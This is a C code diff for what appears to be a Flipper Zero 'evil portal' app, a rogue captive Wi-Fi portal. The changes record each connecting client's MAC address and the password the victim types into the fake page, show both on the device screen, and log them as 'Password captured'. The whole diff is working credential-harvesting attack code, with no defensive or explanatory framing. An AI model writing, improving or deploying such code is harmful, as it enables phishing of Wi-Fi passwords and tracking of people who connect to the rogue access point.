@@ -41,7 +41,8 @@ struct PortalData {
     uint8_t html_selection;
     bool html_loaded;
     uint32_t submit_count;
-    char last_data[64];
+    char last_mac[20];
+    char last_password[64];
     FuriThread* thread;
     TextInput* text_input;
     bool ssid_entered;
@@ -199,20 +200,21 @@ static void portal_draw(Canvas* canvas, void* model) {
         canvas_set_font(canvas, FontSecondary);
         
         char line[48];
-        snprintf(line, sizeof(line), "AP: %s", data->ssid);
+        snprintf(line, sizeof(line), "AP: %.20s", data->ssid);
         canvas_draw_str(canvas, 2, 24, line);
         
-        snprintf(line, sizeof(line), "Submissions: %lu", data->submit_count);
-        canvas_draw_str(canvas, 2, 38, line);
-        
-        if(data->last_data[0]) {
-            canvas_draw_str(canvas, 2, 52, "Last:");
-            // Truncate if too long
-            char truncated[24];
-            strncpy(truncated, data->last_data, 23);
-            truncated[23] = '\0';
-            canvas_draw_str(canvas, 2, 62, truncated);
+        if(data->last_mac[0]) {
+            snprintf(line, sizeof(line), "MAC: %s", data->last_mac);
+            canvas_draw_str(canvas, 2, 36, line);
         }
+        
+        if(data->last_password[0]) {
+            snprintf(line, sizeof(line), "Pass: %.18s", data->last_password);
+            canvas_draw_str(canvas, 2, 48, line);
+        }
+        
+        snprintf(line, sizeof(line), "Submissions: %lu", data->submit_count);
+        canvas_draw_str(canvas, 2, 62, line);
     }
 }
 
@@ -359,23 +361,41 @@ static int32_t portal_thread(void* context) {
     FURI_LOG_I(TAG, "Sending: %s", cmd);
     uart_send_command(app, cmd);
     
-    // Monitor for submissions
+    // Monitor for client connections and password submissions
     FURI_LOG_I(TAG, "Monitoring for submissions");
     while(!data->attack_finished) {
         const char* line = uart_read_line(app, 500);
         if(line && line[0]) {
             FURI_LOG_I(TAG, "RX: %s", line);
             
-            // Check for password submission
-            const char* pwd = strstr(line, "Password:");
+            // Check for client MAC: "Client connected - MAC: AA:BB:CC:DD:EE:FF"
+            const char* mac = strstr(line, "Client connected - MAC:");
+            if(mac) {
+                mac += 24;
+                while(*mac == ' ') mac++;
+                size_t i = 0;
+                while(*mac && *mac != '\n' && *mac != '\r' && i < sizeof(data->last_mac) - 1) {
+                    data->last_mac[i++] = *mac++;
+                }
+                data->last_mac[i] = '\0';
+                FURI_LOG_I(TAG, "Client MAC: %s", data->last_mac);
+            }
+            
+            // Check for portal password: "Portal password received: bbb"
+            const char* pwd = strstr(line, "Portal password received:");
             if(pwd) {
-                pwd += 9;  // Skip "Password:"
+                pwd += 25;  // Skip "Portal password received:"
                 while(*pwd == ' ') pwd++;
-                strncpy(data->last_data, pwd, sizeof(data->last_data) - 1);
-                data->last_data[sizeof(data->last_data) - 1] = '\0';
+                strncpy(data->last_password, pwd, sizeof(data->last_password) - 1);
+                data->last_password[sizeof(data->last_password) - 1] = '\0';
+                // Trim trailing whitespace
+                size_t pl = strlen(data->last_password);
+                while(pl > 0 && (data->last_password[pl-1] == '\n' || data->last_password[pl-1] == '\r' || data->last_password[pl-1] == ' ')) {
+                    data->last_password[--pl] = '\0';
+                }
                 data->submit_count++;
                 FURI_LOG_I(TAG, "Password captured: %s (total: %lu)", 
-                    data->last_data, data->submit_count);
+                    data->last_password, data->submit_count);
             }
         }
         furi_delay_ms(100);
